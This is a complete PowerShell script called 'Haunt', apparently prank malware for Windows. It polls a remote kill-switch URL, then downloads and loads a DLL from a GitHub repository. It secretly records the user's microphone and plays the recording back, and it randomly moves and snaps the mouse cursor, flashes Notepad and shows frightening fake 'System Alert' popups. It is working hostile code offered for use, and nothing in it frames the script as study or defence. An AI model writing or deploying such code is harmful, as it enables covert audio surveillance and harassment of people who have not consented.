Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName PresentationFramework

# === Logger Setup ===
$log = "$env:TEMP\haunt_debug.log"
"[$(Get-Date)] Starting Haunt" | Out-File $log -Append
function Log { param([string]$msg) "[$(Get-Date)] $msg" | Out-File $log -Append }

# === Kill Switch Check ===
$killURL = "https://raw.githubusercontent.com/DrSp1cy/Haunt/refs/heads/main/kill.txt"
try {
    $status = (Invoke-WebRequest $killURL -UseBasicParsing).StatusCode
    if ($status -ne 200) { Log "Kill switch active. Exiting."; exit }
} catch { Log "Kill check failed. Assuming kill. Exiting."; exit }

# === NAudio Disk Load (fixed) ===
$naudioPath = "$env:TEMP\NAudio.dll"
try {
    Invoke-WebRequest "https://raw.githubusercontent.com/DrSp1cy/Haunt/refs/heads/main/NAudio.dll" -OutFile $naudioPath -UseBasicParsing
    Add-Type -Path $naudioPath
    $audioOK = $true
    Log "NAudio loaded from disk"
} catch {
    $audioOK = $false
    Log "NAudio load FAILED: $_"
}

# === Audio Recording Setup ===
$waveIn = $null
$writer = $null
$waveFile = "$env:TEMP\ghost_record.wav"
if ($audioOK) {
    try {
        $waveIn = New-Object NAudio.Wave.WaveInEvent
        $writer = New-Object NAudio.Wave.WaveFileWriter $waveFile, $waveIn.WaveFormat
        $waveIn.DataAvailable += {
            param($s, $a)
            $writer.Write($a.Buffer, 0, $a.BytesRecorded)
        }
        $waveIn.StartRecording()
        Log "Recording started"
    } catch {
        $audioOK = $false
        Log "Audio setup FAILED: $_"
    }
}

# === Main Loop ===
while ($true) {
    try {
        $status = (Invoke-WebRequest $killURL -UseBasicParsing).StatusCode
        if ($status -ne 200) { Log "Kill switch triggered. Exiting."; break }
    } catch {
        Log "Kill check error. Assuming kill."; break
    }

    Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 25)

    # === Mouse Movement (safe)
    try {
        $pos = [System.Windows.Forms.Cursor]::Position
        $x = [int]$pos.X
        $y = [int]$pos.Y
        $dx = Get-Random -Minimum -30 -Maximum 30
        $dy = Get-Random -Minimum -30 -Maximum 30
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $newX = [Math]::Min([Math]::Max(0, $x + $dx), $screen.Width - 1)
        $newY = [Math]::Min([Math]::Max(0, $y + $dy), $screen.Height - 1)
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($newX, $newY)
        Log "Moved mouse to ($newX,$newY)"
    } catch {
        Log "Mouse move failed: $_"
    }

    # === Snap to corner
    if ((Get-Random -Minimum 1 -Maximum 10) -eq 3) {
        try {
            $original = [System.Windows.Forms.Cursor]::Position
            $corner = if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) {
                New-Object System.Drawing.Point(0, 0)
            } else {
                New-Object System.Drawing.Point($screen.Width - 1, $screen.Height - 1)
            }
            [System.Windows.Forms.Cursor]::Position = $corner
            Start-Sleep -Milliseconds 300
            [System.Windows.Forms.Cursor]::Position = $original
            Log "Snap teleport executed"
        } catch {
            Log "Snap teleport failed: $_"
        }
    }

    # === Notepad Flash
    if ((Get-Random -Minimum 1 -Maximum 30) -eq 7) {
        try {
            Start-Process notepad
            Start-Sleep -Seconds 1
            Get-Process notepad | Stop-Process
            Log "Notepad opened & closed"
        } catch {
            Log "Notepad flash failed: $_"
        }
    }

    # === Audio Playback
    if ($audioOK -and (Get-Random -Minimum 1 -Maximum 25) -eq 5) {
        try {
            $waveIn.StopRecording(); $writer.Dispose()
            Start-Sleep -Milliseconds 300
            $player = New-Object NAudio.Wave.AudioFileReader $waveFile
            $output = New-Object NAudio.Wave.WaveOutEvent
            $output.Init($player)
            $output.Play()
            while ($output.PlaybackState -eq 'Playing') {
                Start-Sleep -Milliseconds 200
            }
            $writer = New-Object NAudio.Wave.WaveFileWriter $waveFile, $waveIn.WaveFormat
            $waveIn.StartRecording()
            Log "Audio playback successful"
        } catch {
            Log "Audio playback FAILED: $_"
        }
    }

    # === Creepy Popup
    if ((Get-Random -Minimum 1 -Maximum 15) -eq 6) {
        $msg = Get-Random @(
            "I know what you did.",
            "They're watching.",
            "Stop looking behind you.",
            "This isn't your computer anymore."
        )
        try {
            [System.Windows.MessageBox]::Show($msg, "System Alert", "OK", "Error")
            Log "Popup displayed: $msg"
        } catch {
            Log "Popup display failed: $_"
        }
    }
}
